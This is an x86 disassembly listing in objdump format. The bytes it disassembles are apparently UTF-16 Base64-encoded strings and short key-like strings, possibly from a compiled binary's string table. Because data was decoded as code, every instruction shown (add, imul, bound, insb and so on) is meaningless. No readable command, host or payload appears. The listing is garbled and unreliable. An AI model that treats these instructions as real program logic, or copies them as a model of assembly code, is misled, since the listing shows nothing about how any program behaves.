100040df:	00 59 00             	add    %bl,0x0(%ecx)
100040e2:	6c                   	insb   (%dx),%es:(%edi)
100040e3:	00 68 00             	add    %ch,0x0(%eax)
100040e6:	43                   	inc    %ebx
100040e7:	00 53 00             	add    %dl,0x0(%ebx)
100040ea:	6b 00 68             	imul   $0x68,(%eax),%eax
100040ed:	00 32                	add    %dh,(%edx)
100040ef:	00 53 00             	add    %dl,0x0(%ebx)
100040f2:	47                   	inc    %edi
100040f3:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
100040f7:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100040fb:	00 4e 00             	add    %cl,0x0(%esi)
100040fe:	34 00                	xor    $0x0,%al
10004100:	55                   	push   %ebp
10004101:	00 6b 00             	add    %ch,0x0(%ebx)
10004104:	70 00                	jo     0x10004106
10004106:	49                   	dec    %ecx
10004107:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
1000410b:	00 68 00             	add    %ch,0x0(%eax)
1000410e:	70 00                	jo     0x10004110
10004110:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10004114:	78 00                	js     0x10004116
10004116:	7a 00                	jp     0x10004118
10004118:	65 00 46 00          	add    %al,%gs:0x0(%esi)
1000411c:	4a                   	dec    %edx
1000411d:	00 77 00             	add    %dh,0x0(%edi)
10004120:	59                   	pop    %ecx
10004121:	00 6b 00             	add    %ch,0x0(%ebx)
10004124:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
10004128:	53                   	push   %ebx
10004129:	00 48 00             	add    %cl,0x0(%eax)
1000412c:	5a                   	pop    %edx
1000412d:	00 49 00             	add    %cl,0x0(%ecx)
10004130:	61                   	popa
10004131:	00 58 00             	add    %bl,0x0(%eax)
10004134:	68 00 4d 00 63       	push   $0x63004d00
10004139:	00 33                	add    %dh,(%ebx)
1000413b:	00 68 00             	add    %ch,0x0(%eax)
1000413e:	53                   	push   %ebx
1000413f:	00 53 00             	add    %dl,0x0(%ebx)
10004142:	6b 00 68             	imul   $0x68,(%eax),%eax
10004145:	00 32                	add    %dh,(%edx)
10004147:	00 53 00             	add    %dl,0x0(%ebx)
1000414a:	47                   	inc    %edi
1000414b:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
1000414f:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
10004153:	00 4e 00             	add    %cl,0x0(%esi)
10004156:	34 00                	xor    $0x0,%al
10004158:	55                   	push   %ebp
10004159:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
1000415d:	00 35 00 53 00 6b    	add    %dh,0x6b005300
10004163:	00 68 00             	add    %ch,0x0(%eax)
10004166:	32 00                	xor    (%eax),%al
10004168:	53                   	push   %ebx
10004169:	00 47 00             	add    %al,0x0(%edi)
1000416c:	6c                   	insb   (%dx),%es:(%edi)
1000416d:	00 34 00             	add    %dh,(%eax,%eax,1)
10004170:	54                   	push   %esp
10004171:	00 48 00             	add    %cl,0x0(%eax)
10004174:	4e                   	dec    %esi
10004175:	00 34 00             	add    %dh,(%eax,%eax,1)
10004178:	55                   	push   %ebp
10004179:	00 67 00             	add    %ah,0x0(%edi)
1000417c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004181:	15 4a 00 48 00       	adc    $0x48004a,%eax
10004186:	76 00                	jbe    0x10004188
10004188:	48                   	dec    %eax
10004189:	00 69 00             	add    %ch,0x0(%ecx)
1000418c:	78 00                	js     0x1000418e
1000418e:	4c                   	dec    %esp
1000418f:	00 73 00             	add    %dh,0x0(%ebx)
10004192:	78 00                	js     0x10004194
10004194:	52                   	push   %edx
10004195:	00 00                	add    %al,(%eax)
10004197:	80 b9 51 00 30 00 39 	cmpb   $0x39,0x300051(%ecx)
1000419e:	00 4a 00             	add    %cl,0x0(%edx)
100041a1:	57                   	push   %edi
100041a2:	00 55 00             	add    %dl,0x0(%ebp)
100041a5:	6c                   	insb   (%dx),%es:(%edi)
100041a6:	00 68 00             	add    %ch,0x0(%eax)
100041a9:	61                   	popa
100041aa:	00 56 00             	add    %dl,0x0(%esi)
100041ad:	51                   	push   %ecx
100041ae:	00 31                	add    %dh,(%ecx)
100041b0:	00 4f 00             	add    %cl,0x0(%edi)
100041b3:	56                   	push   %esi
100041b4:	00 56 00             	add    %dl,0x0(%esi)
100041b7:	74 00                	je     0x100041b9
100041b9:	56                   	push   %esi
100041ba:	00 6b 00             	add    %ch,0x0(%ebx)
100041bd:	4e                   	dec    %esi
100041be:	00 50 00             	add    %dl,0x0(%eax)
100041c1:	53                   	push   %ebx
100041c2:	00 56 00             	add    %dl,0x0(%esi)
100041c5:	6c                   	insb   (%dx),%es:(%edi)
100041c6:	00 4a 00             	add    %cl,0x0(%edx)
100041c9:	59                   	pop    %ecx
100041ca:	00 57 00             	add    %dl,0x0(%edi)
100041cd:	6c                   	insb   (%dx),%es:(%edi)
100041ce:	00 55 00             	add    %dl,0x0(%ebp)
100041d1:	4e                   	dec    %esi
100041d2:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
100041d6:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
100041da:	00 30                	add    %dh,(%eax)
100041dc:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
100041e0:	00 53 00             	add    %dl,0x0(%ebx)
100041e3:	57                   	push   %edi
100041e4:	00 46 00             	add    %al,0x0(%esi)
100041e7:	70 00                	jo     0x100041e9
100041e9:	56                   	push   %esi
100041ea:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
100041ee:	00 35 00 62 00 6c    	add    %dh,0x6c006200
100041f4:	00 46 00             	add    %al,0x0(%esi)
100041f7:	59                   	pop    %ecx
100041f8:	00 51 00             	add    %dl,0x0(%ecx)
100041fb:	30 00                	xor    %al,(%eax)
100041fd:	39 00                	cmp    %eax,(%eax)
100041ff:	4a                   	dec    %edx
10004200:	00 57 00             	add    %dl,0x0(%edi)
10004203:	55                   	push   %ebp
10004204:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10004208:	00 61 00             	add    %ah,0x0(%ecx)
1000420b:	56                   	push   %esi
1000420c:	00 51 00             	add    %dl,0x0(%ecx)
1000420f:	31 00                	xor    %eax,(%eax)
10004211:	4f                   	dec    %edi
10004212:	00 55 00             	add    %dl,0x0(%ebp)
10004215:	4e                   	dec    %esi
10004216:	00 50 00             	add    %dl,0x0(%eax)
10004219:	53                   	push   %ebx
1000421a:	00 56 00             	add    %dl,0x0(%esi)
1000421d:	6c                   	insb   (%dx),%es:(%edi)
1000421e:	00 4a 00             	add    %cl,0x0(%edx)
10004221:	59                   	pop    %ecx
10004222:	00 57 00             	add    %dl,0x0(%edi)
10004225:	6c                   	insb   (%dx),%es:(%edi)
10004226:	00 55 00             	add    %dl,0x0(%ebp)
10004229:	4e                   	dec    %esi
1000422a:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
1000422e:	00 4f 00             	add    %cl,0x0(%edi)
10004231:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
10004235:	4e                   	dec    %esi
10004236:	00 50 00             	add    %dl,0x0(%eax)
10004239:	53                   	push   %ebx
1000423a:	00 56 00             	add    %dl,0x0(%esi)
1000423d:	6c                   	insb   (%dx),%es:(%edi)
1000423e:	00 4a 00             	add    %cl,0x0(%edx)
10004241:	59                   	pop    %ecx
10004242:	00 57 00             	add    %dl,0x0(%edi)
10004245:	6c                   	insb   (%dx),%es:(%edi)
10004246:	00 55 00             	add    %dl,0x0(%ebp)
10004249:	4e                   	dec    %esi
1000424a:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000424e:	00 3d 00 00 15 43    	add    %bh,0x43150000
10004254:	00 4f 00             	add    %cl,0x0(%edi)
10004257:	49                   	dec    %ecx
10004258:	00 59 00             	add    %bl,0x0(%ecx)
1000425b:	49                   	dec    %ecx
1000425c:	00 61 00             	add    %ah,0x0(%ecx)
1000425f:	69 00 54 00 35 00    	imul   $0x350054,(%eax),%eax
10004265:	39 00                	cmp    %eax,(%eax)
10004267:	00 80 b9 53 00 54    	add    %al,0x540053b9(%eax)
1000426d:	00 56 00             	add    %dl,0x0(%esi)
10004270:	7a 00                	jp     0x10004272
10004272:	53                   	push   %ebx
10004273:	00 7a 00             	add    %bh,0x0(%edx)
10004276:	4a                   	dec    %edx
10004277:	00 6f 00             	add    %ch,0x0(%edi)
1000427a:	62 00                	bound  %eax,(%eax)
1000427c:	32 00                	xor    (%eax),%al
1000427e:	52                   	push   %edx
1000427f:	00 59 00             	add    %bl,0x0(%ecx)
10004282:	64 00 32             	add    %dh,%fs:(%edx)
10004285:	00 46 00             	add    %al,0x0(%esi)
10004288:	58                   	pop    %eax
10004289:	00 65 00             	add    %ah,0x0(%ebp)
1000428c:	45                   	inc    %ebp
1000428d:	00 6b 00             	add    %ch,0x0(%ebx)
10004290:	31 00                	xor    %eax,(%eax)
10004292:	63 00                	arpl   %eax,(%eax)
10004294:	30 00                	xor    %al,(%eax)
10004296:	73 00                	jae    0x10004298
10004298:	79 00                	jns    0x1000429a
1000429a:	61                   	popa
1000429b:	00 47 00             	add    %al,0x0(%edi)
1000429e:	39 00                	cmp    %eax,(%eax)
100042a0:	6b 00 57             	imul   $0x57,(%eax),%eax
100042a3:	00 48 00             	add    %cl,0x0(%eax)
100042a6:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
100042aa:	4e                   	dec    %esi
100042ab:	00 58 00             	add    %bl,0x0(%eax)
100042ae:	4e                   	dec    %esi
100042af:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
100042b3:	00 6d 00             	add    %ch,0x0(%ebp)
100042b6:	68 00 76 00 5a       	push   $0x5a007600
100042bb:	00 46 00             	add    %al,0x0(%esi)
100042be:	68 00 33 00 61       	push   $0x61003300
100042c3:	00 47 00             	add    %al,0x0(%edi)
100042c6:	4d                   	dec    %ebp
100042c7:	00 79 00             	add    %bh,0x0(%ecx)
100042ca:	53                   	push   %ebx
100042cb:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
100042cf:	00 7a 00             	add    %bh,0x0(%edx)
100042d2:	53                   	push   %ebx
100042d3:	00 7a 00             	add    %bh,0x0(%edx)
100042d6:	4a                   	dec    %edx
100042d7:	00 6f 00             	add    %ch,0x0(%edi)
100042da:	62 00                	bound  %eax,(%eax)
100042dc:	32 00                	xor    (%eax),%al
100042de:	52                   	push   %edx
100042df:	00 59 00             	add    %bl,0x0(%ecx)
100042e2:	64 00 30             	add    %dh,%fs:(%eax)
100042e5:	00 6b 00             	add    %ch,0x0(%ebx)
100042e8:	31 00                	xor    %eax,(%eax)
100042ea:	63 00                	arpl   %eax,(%eax)
100042ec:	30 00                	xor    %al,(%eax)
100042ee:	73 00                	jae    0x100042f0
100042f0:	79 00                	jns    0x100042f2
100042f2:	61                   	popa
100042f3:	00 47 00             	add    %al,0x0(%edi)
100042f6:	39 00                	cmp    %eax,(%eax)
100042f8:	6b 00 57             	imul   $0x57,(%eax),%eax
100042fb:	00 48 00             	add    %cl,0x0(%eax)
100042fe:	63 00                	arpl   %eax,(%eax)
10004300:	77 00                	ja     0x10004302
10004302:	50                   	push   %eax
10004303:	00 55 00             	add    %dl,0x0(%ebp)
10004306:	6b 00 31             	imul   $0x31,(%eax),%eax
10004309:	00 63 00             	add    %ah,0x0(%ebx)
1000430c:	30 00                	xor    %al,(%eax)
1000430e:	73 00                	jae    0x10004310
10004310:	79 00                	jns    0x10004312
10004312:	61                   	popa
10004313:	00 47 00             	add    %al,0x0(%edi)
10004316:	39 00                	cmp    %eax,(%eax)
10004318:	6b 00 57             	imul   $0x57,(%eax),%eax
1000431b:	00 48 00             	add    %cl,0x0(%eax)
1000431e:	63 00                	arpl   %eax,(%eax)
10004320:	3d 00 00 15 49       	cmp    $0x49150000,%eax
10004325:	00 35 00 73 00 4b    	add    %dh,0x4b007300
1000432b:	00 32                	add    %dh,(%edx)
1000432d:	00 68 00             	add    %ch,0x0(%eax)
10004330:	6f                   	outsl  %ds:(%esi),(%dx)
10004331:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004335:	00 77 00             	add    %dh,0x0(%edi)
10004338:	00 80 f9 56 00 44    	add    %al,0x440056f9(%eax)
1000433e:	00 4a 00             	add    %cl,0x0(%edx)
10004341:	49                   	dec    %ecx
10004342:	00 59 00             	add    %bl,0x0(%ecx)
10004345:	56                   	push   %esi
10004346:	00 56 00             	add    %dl,0x0(%esi)
10004349:	45                   	inc    %ebp
1000434a:	00 59 00             	add    %bl,0x0(%ecx)
1000434d:	6e                   	outsb  %ds:(%esi),(%dx)
1000434e:	00 70 00             	add    %dh,0x0(%eax)
10004351:	4f                   	dec    %edi
10004352:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10004356:	00 46 00             	add    %al,0x0(%esi)
10004359:	59                   	pop    %ecx
1000435a:	00 51 00             	add    %dl,0x0(%ecx)
1000435d:	6c                   	insb   (%dx),%es:(%edi)
1000435e:	00 51 00             	add    %dl,0x0(%ecx)
10004361:	79 00                	jns    0x10004363
10004363:	53                   	push   %ebx
10004364:	00 47 00             	add    %al,0x0(%edi)
10004367:	46                   	inc    %esi
10004368:	00 56 00             	add    %dl,0x0(%esi)
1000436b:	52                   	push   %edx
1000436c:	00 47 00             	add    %al,0x0(%edi)
1000436f:	4a                   	dec    %edx
10004370:	00 36                	add    %dh,(%esi)
10004372:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004376:	00 39                	add    %bh,(%ecx)
10004378:	00 55 00             	add    %dl,0x0(%ebp)
1000437b:	4d                   	dec    %ebp
1000437c:	00 6b 00             	add    %ch,0x0(%ebx)
1000437f:	68 00 68 00 56       	push   $0x56006800
10004384:	00 55 00             	add    %dl,0x0(%ebp)
10004387:	52                   	push   %edx
10004388:	00 69 00             	add    %ch,0x0(%ecx)
1000438b:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
1000438f:	35 00 50 00 64       	xor    $0x64005000,%eax
10004394:	00 31                	add    %dh,(%ecx)
10004396:	00 52 00             	add    %dl,0x0(%edx)
10004399:	48                   	dec    %eax
1000439a:	00 56 00             	add    %dl,0x0(%esi)
1000439d:	44                   	inc    %esp
1000439e:	00 4a 00             	add    %cl,0x0(%edx)
100043a1:	49                   	dec    %ecx
100043a2:	00 59 00             	add    %bl,0x0(%ecx)
100043a5:	56                   	push   %esi
100043a6:	00 56 00             	add    %dl,0x0(%esi)
100043a9:	45                   	inc    %ebp
100043aa:	00 59 00             	add    %bl,0x0(%ecx)
100043ad:	6e                   	outsb  %ds:(%esi),(%dx)
100043ae:	00 70 00             	add    %dh,0x0(%eax)
100043b1:	4f                   	dec    %edi
100043b2:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
100043b6:	00 51 00             	add    %dl,0x0(%ecx)
100043b9:	79 00                	jns    0x100043bb
100043bb:	53                   	push   %ebx
100043bc:	00 47 00             	add    %al,0x0(%edi)
100043bf:	46                   	inc    %esi
100043c0:	00 56 00             	add    %dl,0x0(%esi)
100043c3:	52                   	push   %edx
100043c4:	00 47 00             	add    %al,0x0(%edi)
100043c7:	4a                   	dec    %edx
100043c8:	00 36                	add    %dh,(%esi)
100043ca:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100043ce:	00 39                	add    %bh,(%ecx)
100043d0:	00 47 00             	add    %al,0x0(%edi)
100043d3:	4d                   	dec    %ebp
100043d4:	00 57 00             	add    %dl,0x0(%edi)
100043d7:	4a                   	dec    %edx
100043d8:	00 55 00             	add    %dl,0x0(%ebp)
100043db:	4d                   	dec    %ebp
100043dc:	00 6b 00             	add    %ch,0x0(%ebx)
100043df:	68 00 68 00 56       	push   $0x56006800
100043e4:	00 55 00             	add    %dl,0x0(%ebp)
100043e7:	52                   	push   %edx
100043e8:	00 69 00             	add    %ch,0x0(%ecx)
100043eb:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100043ef:	35 00 50 00 56       	xor    $0x56005000,%eax
100043f4:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
100043f8:	00 49 00             	add    %cl,0x0(%ecx)
100043fb:	59                   	pop    %ecx
100043fc:	00 56 00             	add    %dl,0x0(%esi)
100043ff:	56                   	push   %esi
10004400:	00 45 00             	add    %al,0x0(%ebp)
10004403:	59                   	pop    %ecx
10004404:	00 6e 00             	add    %ch,0x0(%esi)
10004407:	70 00                	jo     0x10004409
10004409:	4f                   	dec    %edi
1000440a:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
1000440e:	00 31                	add    %dh,(%ecx)
10004410:	00 4f 00             	add    %cl,0x0(%edi)
10004413:	62 00                	bound  %eax,(%eax)
10004415:	31 00                	xor    %eax,(%eax)
10004417:	51                   	push   %ecx
10004418:	00 79 00             	add    %bh,0x0(%ecx)
1000441b:	53                   	push   %ebx
1000441c:	00 47 00             	add    %al,0x0(%edi)
1000441f:	46                   	inc    %esi
10004420:	00 56 00             	add    %dl,0x0(%esi)
10004423:	52                   	push   %edx
10004424:	00 47 00             	add    %al,0x0(%edi)
10004427:	4a                   	dec    %edx
10004428:	00 36                	add    %dh,(%esi)
1000442a:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000442e:	00 38                	add    %bh,(%eax)
10004430:	00 3d 00 00 15 54    	add    %bh,0x54150000
10004436:	00 32                	add    %dh,(%edx)
10004438:	00 48 00             	add    %cl,0x0(%eax)
1000443b:	61                   	popa
1000443c:	00 55 00             	add    %dl,0x0(%ebp)
1000443f:	44                   	inc    %esp
10004440:	00 62 00             	add    %ah,0x0(%edx)
10004443:	7a 00                	jp     0x10004445
10004445:	4e                   	dec    %esi
10004446:	00 4f 00             	add    %cl,0x0(%edi)
10004449:	00 79 57             	add    %bh,0x57(%ecx)
1000444c:	00 6e 00             	add    %ch,0x0(%esi)
1000444f:	52                   	push   %edx
10004450:	00 55 00             	add    %dl,0x0(%ebp)
10004453:	59                   	pop    %ecx
10004454:	00 6b 00             	add    %ch,0x0(%ebx)
10004457:	49                   	dec    %ecx
10004458:	00 78 00             	add    %bh,0x0(%eax)
1000445b:	56                   	push   %esi
1000445c:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10004460:	00 45 00             	add    %al,0x0(%ebp)
10004463:	57                   	push   %edi
10004464:	00 56 00             	add    %dl,0x0(%esi)
10004467:	6b 00 7a             	imul   $0x7a,(%eax),%eax
1000446a:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
1000446e:	00 70 00             	add    %dh,0x0(%eax)
10004471:	30 00                	xor    %al,(%eax)
10004473:	56                   	push   %esi
10004474:	00 47 00             	add    %al,0x0(%edi)
10004477:	4a                   	dec    %edx
10004478:	00 43 00             	add    %al,0x0(%ebx)
1000447b:	4d                   	dec    %ebp
1000447c:	00 56 00             	add    %dl,0x0(%esi)
1000447f:	5a                   	pop    %edx
10004480:	00 5a 00             	add    %bl,0x0(%edx)
10004483:	52                   	push   %edx
10004484:	00 46 00             	add    %al,0x0(%esi)
10004487:	6c                   	insb   (%dx),%es:(%edi)
10004488:	00 61 00             	add    %ah,0x0(%ecx)
1000448b:	64 00 46 00          	add    %al,%fs:0x0(%esi)
1000448f:	52                   	push   %edx
10004490:	00 69 00             	add    %ch,0x0(%ecx)
10004493:	51                   	push   %ecx
10004494:	00 6a 00             	add    %ch,0x0(%edx)
10004497:	46                   	inc    %esi
10004498:	00 57 00             	add    %dl,0x0(%edi)
1000449b:	57                   	push   %edi
1000449c:	00 55 00             	add    %dl,0x0(%ebp)
1000449f:	52                   	push   %edx
100044a0:	00 5a 00             	add    %bl,0x0(%edx)
100044a3:	61                   	popa
100044a4:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
100044a8:	00 30                	add    %dh,(%eax)
100044aa:	00 56 00             	add    %dl,0x0(%esi)
100044ad:	47                   	inc    %edi
100044ae:	00 4a 00             	add    %cl,0x0(%edx)
100044b1:	43                   	inc    %ebx
100044b2:	00 4d 00             	add    %cl,0x0(%ebp)
100044b5:	56                   	push   %esi
100044b6:	00 5a 00             	add    %bl,0x0(%edx)
100044b9:	5a                   	pop    %edx
100044ba:	00 52 00             	add    %dl,0x0(%edx)
100044bd:	46                   	inc    %esi
100044be:	00 6b 00             	add    %ch,0x0(%ebx)
100044c1:	3d 00 00 15 5a       	cmp    $0x5a150000,%eax
100044c6:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
100044ca:	00 62 00             	add    %ah,0x0(%edx)
100044cd:	42                   	inc    %edx
100044ce:	00 31                	add    %dh,(%ecx)
100044d0:	00 56 00             	add    %dl,0x0(%esi)
100044d3:	59                   	pop    %ecx
100044d4:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
100044d8:	00 00                	add    %al,(%eax)
100044da:	81 71 62 00 47 00 6b 	xorl   $0x6b004700,0x62(%ecx)
100044e1:	00 77 00             	add    %dh,0x0(%edi)
100044e4:	61                   	popa
100044e5:	00 30                	add    %dh,(%eax)
100044e7:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
100044eb:	00 5a 00             	add    %bl,0x0(%edx)
100044ee:	47                   	inc    %edi
100044ef:	00 46 00             	add    %al,0x0(%esi)
100044f2:	46                   	inc    %esi
100044f3:	00 4f 00             	add    %cl,0x0(%edi)
100044f6:	46                   	inc    %esi
100044f7:	00 4e 00             	add    %cl,0x0(%esi)
100044fa:	58                   	pop    %eax
100044fb:	00 4e 00             	add    %cl,0x0(%esi)
100044fe:	57                   	push   %edi
100044ff:	00 78 00             	add    %bh,0x0(%eax)
10004502:	70 00                	jo     0x10004504
10004504:	4d                   	dec    %ebp
10004505:	00 47 00             	add    %al,0x0(%edi)
10004508:	74 00                	je     0x1000450a
1000450a:	4c                   	dec    %esp
1000450b:	00 55 00             	add    %dl,0x0(%ebp)
1000450e:	32 00                	xor    (%eax),%al
10004510:	52                   	push   %edx
10004511:	00 68 00             	add    %ch,0x0(%eax)
10004514:	52                   	push   %edx
10004515:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
10004519:	00 73 00             	add    %dh,0x0(%ebx)
1000451c:	61                   	popa
1000451d:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004521:	00 72 00             	add    %dh,0x0(%edx)
10004524:	53                   	push   %ebx
10004525:	00 31                	add    %dh,(%ecx)
10004527:	00 4e 00             	add    %cl,0x0(%esi)
1000452a:	6b 00 59             	imul   $0x59,(%eax),%eax
1000452d:	00 55 00             	add    %dl,0x0(%ebp)
10004530:	55                   	push   %ebp
10004531:	00 34 00             	add    %dh,(%eax,%eax,1)
10004534:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004538:	52                   	push   %edx
10004539:	00 48 00             	add    %cl,0x0(%eax)
1000453c:	62 00                	bound  %eax,(%eax)
1000453e:	47                   	inc    %edi
1000453f:	00 6b 00             	add    %ch,0x0(%ebx)
10004542:	77 00                	ja     0x10004544
10004544:	61                   	popa
10004545:	00 30                	add    %dh,(%eax)
10004547:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
1000454b:	00 5a 00             	add    %bl,0x0(%edx)
1000454e:	47                   	inc    %edi
1000454f:	00 46 00             	add    %al,0x0(%esi)
10004552:	46                   	inc    %esi
10004553:	00 4f 00             	add    %cl,0x0(%edi)
10004556:	47                   	inc    %edi
10004557:	00 78 00             	add    %bh,0x0(%eax)
1000455a:	70 00                	jo     0x1000455c
1000455c:	4d                   	dec    %ebp
1000455d:	00 47 00             	add    %al,0x0(%edi)
10004560:	74 00                	je     0x10004562
10004562:	4c                   	dec    %esp
10004563:	00 55 00             	add    %dl,0x0(%ebp)
10004566:	32 00                	xor    (%eax),%al
10004568:	52                   	push   %edx
10004569:	00 68 00             	add    %ch,0x0(%eax)
1000456c:	52                   	push   %edx
1000456d:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
10004571:	00 47 00             	add    %al,0x0(%edi)
10004574:	63 00                	arpl   %eax,(%eax)
10004576:	32 00                	xor    (%eax),%al
10004578:	4a                   	dec    %edx
10004579:	00 73 00             	add    %dh,0x0(%ebx)
1000457c:	61                   	popa
1000457d:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004581:	00 72 00             	add    %dh,0x0(%edx)
10004584:	53                   	push   %ebx
10004585:	00 31                	add    %dh,(%ecx)
10004587:	00 4e 00             	add    %cl,0x0(%esi)
1000458a:	6b 00 59             	imul   $0x59,(%eax),%eax
1000458d:	00 55 00             	add    %dl,0x0(%ebp)
10004590:	55                   	push   %ebp
10004591:	00 34 00             	add    %dh,(%eax,%eax,1)
10004594:	62 00                	bound  %eax,(%eax)
10004596:	47                   	inc    %edi
10004597:	00 6b 00             	add    %ch,0x0(%ebx)
1000459a:	77 00                	ja     0x1000459c
1000459c:	61                   	popa
1000459d:	00 30                	add    %dh,(%eax)
1000459f:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
100045a3:	00 5a 00             	add    %bl,0x0(%edx)
100045a6:	47                   	inc    %edi
100045a7:	00 46 00             	add    %al,0x0(%esi)
100045aa:	46                   	inc    %esi
100045ab:	00 4f 00             	add    %cl,0x0(%edi)
100045ae:	45                   	inc    %ebp
100045af:	00 5a 00             	add    %bl,0x0(%edx)
100045b2:	57                   	push   %edi
100045b3:	00 4d 00             	add    %cl,0x0(%ebp)
100045b6:	47                   	inc    %edi
100045b7:	00 78 00             	add    %bh,0x0(%eax)
100045ba:	70 00                	jo     0x100045bc
100045bc:	4d                   	dec    %ebp
100045bd:	00 47 00             	add    %al,0x0(%edi)
100045c0:	74 00                	je     0x100045c2
100045c2:	4c                   	dec    %esp
100045c3:	00 55 00             	add    %dl,0x0(%ebp)
100045c6:	32 00                	xor    (%eax),%al
100045c8:	52                   	push   %edx
100045c9:	00 68 00             	add    %ch,0x0(%eax)
100045cc:	52                   	push   %edx
100045cd:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
100045d1:	00 73 00             	add    %dh,0x0(%ebx)
100045d4:	61                   	popa
100045d5:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100045d9:	00 72 00             	add    %dh,0x0(%edx)
100045dc:	53                   	push   %ebx
100045dd:	00 31                	add    %dh,(%ecx)
100045df:	00 4e 00             	add    %cl,0x0(%esi)
100045e2:	6b 00 59             	imul   $0x59,(%eax),%eax
100045e5:	00 55 00             	add    %dl,0x0(%ebp)
100045e8:	55                   	push   %ebp
100045e9:	00 34 00             	add    %dh,(%eax,%eax,1)
100045ec:	59                   	pop    %ecx
100045ed:	00 56 00             	add    %dl,0x0(%esi)
100045f0:	64 00 33             	add    %dh,%fs:(%ebx)
100045f3:	00 62 00             	add    %ah,0x0(%edx)
100045f6:	47                   	inc    %edi
100045f7:	00 6b 00             	add    %ch,0x0(%ebx)
100045fa:	77 00                	ja     0x100045fc
100045fc:	61                   	popa
100045fd:	00 30                	add    %dh,(%eax)
100045ff:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
10004603:	00 5a 00             	add    %bl,0x0(%edx)
10004606:	47                   	inc    %edi
10004607:	00 46 00             	add    %al,0x0(%esi)
1000460a:	46                   	inc    %esi
1000460b:	00 4f 00             	add    %cl,0x0(%edi)
1000460e:	47                   	inc    %edi
1000460f:	00 78 00             	add    %bh,0x0(%eax)
10004612:	70 00                	jo     0x10004614
10004614:	4d                   	dec    %ebp
10004615:	00 47 00             	add    %al,0x0(%edi)
10004618:	74 00                	je     0x1000461a
1000461a:	4c                   	dec    %esp
1000461b:	00 55 00             	add    %dl,0x0(%ebp)
1000461e:	32 00                	xor    (%eax),%al
10004620:	52                   	push   %edx
10004621:	00 68 00             	add    %ch,0x0(%eax)
10004624:	52                   	push   %edx
10004625:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10004629:	00 39                	add    %bh,(%ecx)
1000462b:	00 62 00             	add    %ah,0x0(%edx)
1000462e:	47                   	inc    %edi
1000462f:	00 6b 00             	add    %ch,0x0(%ebx)
10004632:	77 00                	ja     0x10004634
10004634:	61                   	popa
10004635:	00 30                	add    %dh,(%eax)
10004637:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
1000463b:	00 5a 00             	add    %bl,0x0(%edx)
1000463e:	47                   	inc    %edi
1000463f:	00 46 00             	add    %al,0x0(%esi)
10004642:	46                   	inc    %esi
10004643:	00 4f 00             	add    %cl,0x0(%edi)
10004646:	41                   	inc    %ecx
10004647:	00 3d 00 3d 00 00    	add    %bh,0x3d00
1000464d:	15 6c 00 69 00       	adc    $0x69006c,%eax
10004652:	30 00                	xor    %al,(%eax)
10004654:	6b 00 4b             	imul   $0x4b,(%eax),%eax
10004657:	00 53 00             	add    %dl,0x0(%ebx)
1000465a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
1000465e:	45                   	inc    %ebp
1000465f:	00 38                	add    %bh,(%eax)
10004661:	00 00                	add    %al,(%eax)
10004663:	80 f9 4d             	cmp    $0x4d,%cl
10004666:	00 33                	add    %dh,(%ebx)
10004668:	00 52 00             	add    %dl,0x0(%edx)
1000466b:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
1000466f:	48                   	dec    %eax
10004670:	00 55 00             	add    %dl,0x0(%ebp)
10004673:	79 00                	jns    0x10004675
10004675:	51                   	push   %ecx
10004676:	00 6a 00             	add    %ch,0x0(%edx)
10004679:	42                   	inc    %edx
1000467a:	00 6f 00             	add    %ch,0x0(%edi)
1000467d:	4e                   	dec    %esi
1000467e:	00 47 00             	add    %al,0x0(%edi)
10004681:	4a                   	dec    %edx
10004682:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
10004686:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
1000468a:	00 30                	add    %dh,(%eax)
